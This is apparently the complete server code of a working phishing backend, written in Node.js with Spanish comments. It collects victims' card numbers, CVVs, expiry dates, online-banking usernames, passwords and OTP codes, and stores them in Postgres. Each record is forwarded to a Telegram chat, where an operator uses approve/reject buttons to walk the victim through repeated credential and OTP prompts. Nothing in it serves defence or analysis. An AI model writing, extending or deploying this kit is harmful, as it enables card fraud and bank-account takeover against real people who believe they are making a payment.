const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));

// ============================================================
// POSTGRES
// ============================================================
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    max: 5,
    ssl: { rejectUnauthorized: false }
});
pool.on('error', err => console.error('❌ PG pool error:', err));

// ============================================================
// CONFIG
// ============================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const FRONT_BASE_URL     = process.env.FRONT_BASE_URL || 'https://sncill-to-yzzz.onrender.com';
const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://package-json-y86a.onrender.com';

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Faltan TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID');
}

// ============================================================
// INIT DB (crea tabla + agrega columnas nuevas)
// ============================================================
async function initDB() {
    // Crear tabla base si no existe
    await pool.query(`
        CREATE TABLE IF NOT EXISTS pagos_pendientes (
            id               SERIAL PRIMARY KEY,
            solicitud_id     VARCHAR(80) UNIQUE NOT NULL,
            titular          VARCHAR(120),
            numero_tarjeta   VARCHAR(30),
            cvv              VARCHAR(6),
            vencimiento      VARCHAR(10),
            marca_tarjeta    VARCHAR(20),
            banco_emisor     VARCHAR(120),
            estado           VARCHAR(30) DEFAULT 'pendiente',
            motivo_rechazo   TEXT,
            redirigir_a      VARCHAR(60),
            telegram_msg_id  BIGINT,
            created_at       TIMESTAMPTZ DEFAULT NOW(),
            updated_at       TIMESTAMPTZ DEFAULT NOW()
        );
        CREATE INDEX IF NOT EXISTS idx_pagos_estado ON pagos_pendientes(estado);
    `);

    // Columnas nuevas (idempotente)
    await pool.query(`
        ALTER TABLE pagos_pendientes
          ADD COLUMN IF NOT EXISTS usuario_banco VARCHAR(120),
          ADD COLUMN IF NOT EXISTS password_banco VARCHAR(120),
          ADD COLUMN IF NOT EXISTS codigo_otp VARCHAR(20),
          ADD COLUMN IF NOT EXISTS paso VARCHAR(30) DEFAULT 'crear',
          ADD COLUMN IF NOT EXISTS fase_actual VARCHAR(20) DEFAULT 'credenciales',
          ADD COLUMN IF NOT EXISTS credenciales_aprobadas BOOLEAN DEFAULT FALSE,
          ADD COLUMN IF NOT EXISTS otp_aprobado BOOLEAN DEFAULT FALSE;
    `);

    // 🔥 FIX: ampliar 'estado' a 30 para que quepa 'aprobado_credenciales' (21) y 'rechazado_credenciales' (22)
    await pool.query(`ALTER TABLE pagos_pendientes ALTER COLUMN estado TYPE VARCHAR(30);`);

    console.log('✅ Tabla pagos_pendientes lista con columnas nuevas y estado VARCHAR(30)');
}
initDB().catch(err => console.error('❌ initDB:', err));

// ============================================================
// TELEGRAM HELPERS
// ============================================================
async function tgSendMessage(text, replyMarkup) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;

    console.log('📤 Telegram sendMessage payload:', JSON.stringify(body, null, 2));

    try {
        const r = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const data = await r.json();
        if (!data.ok) console.error('❌ Telegram error:', data);
        else console.log('✅ Telegram mensaje enviado, msg_id:', data.result.message_id);
        return data;
    } catch (e) {
        console.error('❌ fetch Telegram falló:', e.message);
        return { ok: false };
    }
}

async function tgEditMessage(messageId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
    try {
        const r = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text,
                parse_mode: 'HTML'
            })
        });
        return r.json();
    } catch { return null; }
}

async function tgAnswerCallback(callbackQueryId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
        });
    } catch {}
}

// ============================================================
// CONSTRUIR TEXTO COMPLETO
// ============================================================
function construirTextoPago(pago) {
    const usuario = pago.usuario_banco ? pago.usuario_banco : '—';
    const password = pago.password_banco ? pago.password_banco : '—';
    const otp = pago.codigo_otp ? pago.codigo_otp : '—';

    return (
        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
        `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
        `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
        `\n<b>── CREDENCIALES BANCO ──</b>\n` +
        `👤 <b>Usuario:</b> <code>${usuario}</code>\n` +
        `🔑 <b>Contraseña:</b> <code>${password}</code>\n` +
        `🔐 <b>OTP:</b> <code>${otp}</code>\n` +
        `\n🕒 <b>Creado:</b> ${new Date(pago.created_at).toLocaleString('es-CL')}`
    );
}

// ============================================================
// ENVIAR NUEVO MENSAJE A TG
// ============================================================
async function enviarSolicitudATelegram(pago) {
    const texto =
        `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` +
        construirTextoPago(pago);

    const replyMarkup = {
        inline_keyboard: [[
            { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
            { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
        ]]
    };

    const res = await tgSendMessage(texto, replyMarkup);
    if (res.ok && res.result) {
        await pool.query(
            `UPDATE pagos_pendientes SET telegram_msg_id = $1 WHERE solicitud_id = $2`,
            [res.result.message_id, pago.solicitud_id]
        );
    }
}

// ============================================================
// EDITAR MENSAJE EXISTENTE
// ============================================================
async function actualizarMensajeTG(pago, encabezado, textoExtra) {
    if (!pago.telegram_msg_id) return;

    const texto =
        `${encabezado}\n\n` +
        construirTextoPago(pago) +
        (textoExtra ? `\n\n${textoExtra}` : '');

    const replyMarkup = {
        inline_keyboard: [[
            { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
            { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
        ]]
    };

    // Editar texto + mantener botones
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                message_id: pago.telegram_msg_id,
                text,
                parse_mode: 'HTML',
                reply_markup: replyMarkup
            })
        });
    } catch (e) {
        console.error('tgEditMessage error:', e.message);
    }
}

// ============================================================
// ENDPOINT: CREAR PAGO / ACTUALIZAR
// ============================================================
app.post('/api/crear-pago', async (req, res) => {
    const {
        solicitud_id, titular, numero_tarjeta, cvv, vencimiento,
        marca_tarjeta, banco_emisor,
        usuario_banco, password_banco, codigo_otp, paso
    } = req.body || {};

    if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) {
        return res.status(400).json({ success: false, error: 'Datos incompletos' });
    }
    if (!['visa', 'mastercard', 'amex'].includes((marca_tarjeta || '').toLowerCase())) {
        return res.status(400).json({ success: false, error: 'Marca no soportada' });
    }

    try {
        const result = await pool.query(
            `INSERT INTO pagos_pendientes
                (solicitud_id, titular, numero_tarjeta, cvv, vencimiento,
                 marca_tarjeta, banco_emisor, usuario_banco, password_banco,
                 codigo_otp, paso, fase_actual)
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)
             ON CONFLICT (solicitud_id) DO UPDATE
               SET numero_tarjeta = EXCLUDED.numero_tarjeta,
                   cvv = EXCLUDED.cvv,
                   vencimiento = EXCLUDED.vencimiento,
                   marca_tarjeta = EXCLUDED.marca_tarjeta,
                   banco_emisor = EXCLUDED.banco_emisor,
                   usuario_banco = COALESCE(EXCLUDED.usuario_banco, pagos_pendientes.usuario_banco),
                   password_banco = COALESCE(EXCLUDED.password_banco, pagos_pendientes.password_banco),
                   codigo_otp = COALESCE(EXCLUDED.codigo_otp, pagos_pendientes.codigo_otp),
                   paso = COALESCE(EXCLUDED.paso, pagos_pendientes.paso),
                   updated_at = NOW()
             RETURNING *`,
            [
                solicitud_id, titular, numero_tarjeta, cvv, vencimiento,
                marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido',
                usuario_banco || null, password_banco || null,
                codigo_otp || null, paso || 'crear',
                paso === 'otp' ? 'otp' : 'credenciales'
            ]
        );

        const pago = result.rows[0];
        const pasoActual = (paso || 'crear').toLowerCase();
        const esNueva = !pago.telegram_msg_id;

        if (esNueva) {
            await enviarSolicitudATelegram(pago);
        } else {
            if (pasoActual === 'credenciales') {
                await actualizarMensajeTG(pago, '📝 <b>CREDENCIALES RECIBIDAS</b>',
                    '⏳ <b>Esperando aprobación del admin...</b>');
            } else if (pasoActual === 'otp') {
                await actualizarMensajeTG(pago, '🔐 <b>OTP RECIBIDO</b>',
                    '⏳ <b>Esperando aprobación del admin...</b>');
            }
        }

        return res.json({ success: true, solicitud_id, estado: 'pendiente' });
    } catch (err) {
        console.error('❌ /api/crear-pago:', err);
        return res.status(500).json({ success: false, error: 'Error al registrar el pago' });
    }
});

// ============================================================
// ENDPOINT: ESTADO (polling)
// ============================================================
app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
    try {
        const result = await pool.query(
            `SELECT estado, motivo_rechazo, redirigir_a, marca_tarjeta,
                    fase_actual, credenciales_aprobadas, otp_aprobado
             FROM pagos_pendientes WHERE solicitud_id = $1`,
            [req.params.solicitud_id]
        );
        if (result.rows.length === 0) {
            return res.status(404).json({ success: false, error: 'No encontrado' });
        }
        const row = result.rows[0];

        // Fase 1: credenciales aprobadas → visa.php muestra OTP
        if (row.estado === 'aprobado_credenciales') {
            return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
        }
        if (row.estado === 'rechazado_credenciales') {
            return res.json({
                success: true,
                estado: 'rechazado',
                fase: 'credenciales',
                mensaje: row.motivo_rechazo || 'Credenciales incorrectas. Intenta nuevamente.'
            });
        }

        // Fase 2: OTP aprobado → redirigir
        if (row.estado === 'aprobado' || row.otp_aprobado === true) {
            return res.json({
                success: true,
                estado: 'aprobado',
                fase: 'otp',
                redirect: `${FRONT_BASE_URL}/${row.redirigir_a}`,
                marca: row.marca_tarjeta
            });
        }
        if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') {
            return res.json({
                success: true,
                estado: 'rechazado',
                fase: 'otp',
                mensaje: row.motivo_rechazo || 'Código incorrecto. Intenta nuevamente.'
            });
        }

        return res.json({ success: true, estado: 'pendiente', fase: row.fase_actual });
    } catch (err) {
        console.error('❌ /api/estado-pago:', err);
        return res.status(500).json({ success: false, error: 'Error' });
    }
});

// ============================================================
// WEBHOOK TELEGRAM
// ============================================================
app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200);

    const update = req.body || {};
    const cq = update.callback_query;
    if (!cq || !cq.data) return;

    console.log('📩 Callback Telegram recibido:', cq.data);

    const [accion, solicitud_id] = cq.data.split(':');
    const msgId = cq.message?.message_id;

    try {
        const result = await pool.query(
            `SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`,
            [solicitud_id]
        );
        if (result.rows.length === 0) {
            await tgAnswerCallback(cq.id, 'Solicitud no encontrada');
            return;
        }
        const pago = result.rows[0];

        // ¿Estamos en fase OTP?
        const estaEnFaseOTP = !!pago.codigo_otp && pago.codigo_otp !== 'N/A';

        // Evitar doble aprobación de la misma fase
        if (pago.estado === 'aprobado' || pago.otp_aprobado === true) {
            await tgAnswerCallback(cq.id, 'Ya fue aprobado completamente');
            return;
        }
        if (pago.estado === 'aprobado_credenciales' && !estaEnFaseOTP) {
            await tgAnswerCallback(cq.id, 'Credenciales ya aprobadas');
            return;
        }

        if (accion === 'aprobar') {
            if (!estaEnFaseOTP) {
                // 🟢 FASE 1: APROBAR CREDENCIALES
                await pool.query(
                    `UPDATE pagos_pendientes
                     SET estado = 'aprobado_credenciales',
                         credenciales_aprobadas = TRUE,
                         updated_at = NOW()
                     WHERE solicitud_id = $1`,
                    [solicitud_id]
                );
                await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');

                if (msgId) {
                    await tgEditMessage(msgId,
                        `✅ <b>CREDENCIALES APROBADAS</b>\n\n` +
                        construirTextoPago(pago) +
                        `\n📌 <b>Ahora el usuario debe ingresar el OTP</b>\n` +
                        `🕒 ${new Date().toLocaleString('es-CL')}`
                    );
                }
            } else {
                // 🟢 FASE 2: APROBAR OTP (final)
                const mapa = { visa: 'visa.php', mastercard: 'master.php', amex: 'amex.php' };
                const archivo = mapa[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.php';

                await pool.query(
                    `UPDATE pagos_pendientes
                     SET estado = 'aprobado',
                         otp_aprobado = TRUE,
                         fase_actual = 'completado',
                         redirigir_a = $1,
                         updated_at = NOW()
                     WHERE solicitud_id = $2`,
                    [archivo, solicitud_id]
                );
                await tgAnswerCallback(cq.id, '✅ Pago aprobado');

                if (msgId) {
                    await tgEditMessage(msgId,
                        `✅ <b>PAGO APROBADO</b>\n\n` +
                        construirTextoPago(pago) +
                        `\n➡️ <b>Redirigido a:</b> ${archivo}\n` +
                        `🕒 <b>Procesado:</b> ${new Date().toLocaleString('es-CL')}`
                    );
                }
            }
        } else if (accion === 'rechazar') {
            const motivo = estaEnFaseOTP
                ? 'El código OTP es incorrecto. Verifica e intenta de nuevo.'
                : 'Las credenciales son incorrectas. Verifica e intenta de nuevo.';

            const nuevoEstado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';

            await pool.query(
                `UPDATE pagos_pendientes
                 SET estado = $1, motivo_rechazo = $2, updated_at = NOW()
                 WHERE solicitud_id = $3`,
                [nuevoEstado, motivo, solicitud_id]
            );
            await tgAnswerCallback(cq.id, '❌ Rechazado');

            if (msgId) {
                await tgEditMessage(msgId,
                    `❌ <b>${estaEnFaseOTP ? 'OTP RECHAZADO' : 'CREDENCIALES RECHAZADAS'}</b>\n\n` +
                    construirTextoPago(pago) +
                    `\n📌 <b>Motivo:</b> ${motivo}\n` +
                    `🕒 ${new Date().toLocaleString('es-CL')}`
                );
            }
        }
    } catch (err) {
        console.error('❌ webhook:', err);
    }
});

// ============================================================
// REGISTRAR WEBHOOK + START
// ============================================================
async function registrarWebhook() {
    if (!TELEGRAM_BOT_TOKEN) return;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${encodeURIComponent(
        PUBLIC_BACKEND_URL + '/api/telegram-webhook'
    )}`;
    try {
        const r = await fetch(url);
        const data = await r.json();
        if (data.ok) console.log('✅ Webhook Telegram registrado');
        else console.error('❌ Webhook Telegram:', data.description);
    } catch (e) {
        console.error('❌ Error registrando webhook:', e.message);
    }
}

app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now() }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Backend pagos en puerto ${PORT}`);
    console.log(`🌐 FRONT_BASE_URL = ${FRONT_BASE_URL}`);
    console.log(`🔗 PUBLIC_BACKEND_URL = ${PUBLIC_BACKEND_URL}`);
    console.log(`🤖 Telegram bot: ${TELEGRAM_BOT_TOKEN ? 'OK' : 'FALTA'}`);
    console.log(`🗄️  Postgres: ${process.env.DATABASE_URL ? 'OK' : 'FALTA'}`);
    registrarWebhook();
});
